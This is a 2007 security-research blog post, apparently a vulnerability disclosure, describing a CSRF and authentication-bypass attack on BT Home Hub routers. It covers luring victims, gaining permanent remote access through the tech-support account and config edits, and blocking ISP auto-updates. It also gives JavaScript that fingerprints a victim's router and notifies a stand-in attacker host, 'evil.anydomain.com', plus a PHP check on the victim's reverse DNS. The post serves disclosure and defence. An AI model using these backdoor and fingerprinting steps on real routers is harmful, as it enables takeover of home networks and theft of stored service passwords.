---
title: BT Home Flub Pwnin The BT Home Hub (2)
author: adrian-pastor
date: Tue, 16 Oct 2007 22:02:03 GMT
template: post.jade
---

In this post I'll elaborate a bit more on our [demo video](http://stage6.divx.com/user/gnucitizen/video/1722388/BT-Home-Flub) previously released and what the intruder can do to remotely access the Home Hub _anytime and from anywhere_ after it's been been broken into.  You are recommended to read the [first part](/blog/bt-home-flub-pwnin-the-bt-home-hub) of this post if you haven't done so yet.

So here is the attack illustrated in the demo video. The victim user is tricked - through Gtalk - to visit a website that contains malicious code. The malicious code runs in the background and does NOT exploit any vulnerabilities on the victim's browser at all, neither does it rely on ActiveX, therefore it's not picked up by anti-spyware/antivirus software. The malicious code is a simple combination of HTML and JavaScript, which exploits two vulnerabilities on the Home Hub (note that there are other vulnerabilities we found as well):

* CSRF
* Authentication bypass bug (thanks to this the exploit works even if the user has changed the default admin password)

After the victim user visits the malicious website, he's redirected to a funny video of [Techno Viking](http://www.google.com/search?ie=UTF-8&oe=UTF-8&sourceid=navclient&gfns=1&q=techno+viking) hosted by Youtube. Thus, the victim is distracted away from the fact that his router has just been compromised. There are other things we could have done on the malicious website besides a redirect to a Youtube video. For instance, we could have simply embedded third-party content from other websites through iframes in order to distract the victim from the fact that he's been victim of an attack.

### Tricking the victim to visit the evil site

We've been asked by some non-technical users how would the intruder incite the victim to visit the malicious link. Malware criminals are experts at finding ways to attract people to their malicious websites. Well, there are plenty of examples we can give. The following are some:

* Through a chat conversation (i.e.: messenger or IRC)
* Through emails delivered in a mass fashion targeting [UK email addresses](http://mail.google.com/mail/help/intl/en-GB/googlemail.html)
* By placing the malicious link on a popular website where it's common to find user-generated content. i.e.: Youtube, Myspace, Facebook, Bebo ...
* Through a website that claims to offer free porn
* Through a website that claims to offer  free [warez](http://en.wikipedia.org/wiki/Warez)
* Black [SEO](http://en.wikipedia.org/wiki/Search_engine_optimization)
* By setting up a blog through which the audience is [involved emotionally](http://www.spamfighter.com/News_Read_Spamfighter.asp?UID=419) regarding a current issue

### Backdooring the Home Hub PERMANENTLY

Once the router has been compromised the attacker gets an email (as shown in the [demo video](//www.youtube.com/watch?v=i4tkM3UtF1Y)) with the URL needed to access the Home Hub remotely using the "tech support" account - a.k.a. remote assistance. The attacker then logs in using the username 'tech' and a password which was chosen by her and was set when the malicious website was loaded in the victim user's browser. At this point, the intruder can do anything to the router. For instance, because remote assistance gets disabled after 20 minutes of inactivity, the intruder can do the following in order to make sure that she can come back any time to the router to tamper with it:

* Save the Home Hub config file (contains all router settings including the passwords for any services the victim is subscribed to)
* Add the following line in the config file under the `[ servmgr.ini ]` section: `ifadd name=HTTPs group=wan`
* Reload the modified config file so the new changes take place
* Configure the dynamic dns service (if the victim is not currently using it) using the web interface

At this point, the intruder can come back anytime remotely to the Home Hub, even after the remote assistance connection has timed out (happens after 20 mins of inactivity by default). The credentials she would use to login are the same one that were set when the attack took place (username 'tech' and a password of her choice). The cool thing is that although BT Broadband doesn't support static IP addresses, the intruder can simply bypass this restriction and always find the victim router's IP address thanks to it supporting serveral popular (and free) dynamic DNS services!

### Detecting a potentially vulnerable router

When preparing the exploit shown in the video, the malicious code could do either of the following before the actual exploit is submitted to the router:

* do not check if the victim user uses a vulnerable router
* perform some sort of check that concludes with a significant probability whether the victim user's router is vulnerable

The first approach is typically followed by classic worms: the payload is executed no matter what. If the router is vulnerable, then it'll be compromised, otherwise nothing would happen. From the user's end, there is no difference as everything happens in the background.

However, if the intruder wants to be stealth, he will craft the malicious webpage in such a way the exploit is only launched if the victim uses a potentially vulnerable router. This is a more elegant way to perform the attack and minimizes the chances of someone discovering the exploit and making it public.

The following are two simple techniques that can be used. The first technique simply checks if the IP address used by the BT Home Hub is serving a certain image:

    var notifyURL="http://evil.anydomain.com/bthomehubhack/notify.php";
    var imgsrc = 'http://192.168.1.254/images/head_wave.gif';
    var fingerprint_img = new Image();
    fingerprint_img.onerror = function (evt) {
        ; // can't be loaded - couldn't find a vulnerable router
    }
    // only notify attacker if potential vulnerable Thomson Speedtouch / BT Homehub router found
    fingerprint_img.onload = function (evt) {
        C=new Image();
        C.src=notifyURL;
    }

    The second technique simply checks for substrings within the [reverse DNS](http://en.wikipedia.org/wiki/Reverse_DNS_lookup) (PTR record) of the victim router. The following is an example of a reverse DNS record used by a BT Home Hub:

    host86-134-193-152.range86-134.btcentralplus.com

    In PHP we could check for the string 'btcentralplus.com' like this:

    <?php
    $ptr=gethostbyaddr($_SERVER['REMOTE_ADDR']);
    // if string "btcentralplus.com" is contained within victim's reverse lookup
    if(strstr($ptr, "btcentralplus.com")) {
       // then print exploit code
       // EVIL CSRF/AUTH BYPASS CODE GOES HERE!
    }
    ?>

    ### Preventing BT from fixing the vulnerabilities on Hubs that have been owned

    The BT Home Hub has a very neat feature called Auto-Update. The way the feature works is that the BT Home Hub connects regularly to remote servers located on `pbthdm.bt.motive.com`, which can push settings back to the Hub. There have been some concerns over this feature in the Internet community and I can see why. In essence, this feature is a backdoor which allows BT to do anything to your Home Hub remotely. Sure this is meant to be for updates that add new features and/or fix vulnerabilities. The question is, do you trust your ISP to have permanent control of your Internet gateway? I personally don't like the possibility of a disgruntled BT employee being able to tamper with my Home Hub remotely! Not to mention that this feature has [bricked](http://www.digitalspy.co.uk/forums/showthread.php?t=491560) Home Hubs in the past after customizing the configuration.

    An intruder would probably want to avoid any chance of BT disabling her backdoor after auto-updates are applied. Disabling updates can be as easy as changing the following line in the config file to point to a dummy (non-existing) URL. Note that we have NOT tested this idea, but it should work. After all, the intruder can save new changes in the config file using the tech support account.

    server config url=**https://useless-domain.foo/** username=XXXXXXXXXXXXXXXXX password=XXXXXXXXXXXXXXXXX

Perhpaps, the most effective way in which a cracker can break into BT Home Hubs in a mass fashion is by compromising the autoupdate servers. Then, from there, one could push changes back to the Hubs' config files. Imagine someone updating all BT Home Hubs in the UK with remote HTTPs enabled and accessible with a password of her choice. What a botnet would that make! Scary.

### Credits where due

_[pdp](http://www.gnucitizen.org/about/pdp) and I would like to thank Jan Fry and Vijay Thakorlal for helping us testing attacks._
